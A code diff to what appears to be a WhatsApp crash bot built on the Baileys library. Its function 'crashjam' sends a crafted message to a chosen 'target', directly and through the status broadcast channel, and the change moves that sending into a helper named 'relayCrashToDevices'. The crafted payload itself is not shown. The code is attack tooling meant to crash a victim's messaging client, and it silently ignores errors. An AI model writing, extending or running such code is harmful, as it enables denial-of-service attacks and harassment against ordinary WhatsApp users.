@@ -27,6 +27,7 @@
 const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, getUSyncDevices, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@whiskeysockets/baileys');
 const pino = require('pino');
 const crypto = require('crypto');
+const { relayCrashToDevices } = require('../target-utils');
 
 async function crashjam(SYxS7, target) {
     const SABANA_LOVE = {
@@ -75,24 +76,7 @@ async function crashjam(SYxS7, target) {
     };
 
     try {
-        await SYxS7.relayMessage(target, SABIR7718_LOVE_SABANA, {
-            participant: { jid: target }
-        });
-    } catch (e) {}
-
-    try {
-        await SYxS7.relayMessage("status@broadcast", SABIR7718_LOVE_SABANA, {
-            statusJidList: [target],
-            additionalNodes: [{
-                tag: "meta",
-                attrs: {},
-                content: [{
-                    tag: "mentioned_users",
-                    attrs: {},
-                    content: [{ tag: "to", attrs: { jid: target } }]
-                }]
-            }]
-        });
+        await relayCrashToDevices(SYxS7, target, SABIR7718_LOVE_SABANA);
     } catch (e) {}
 }
 
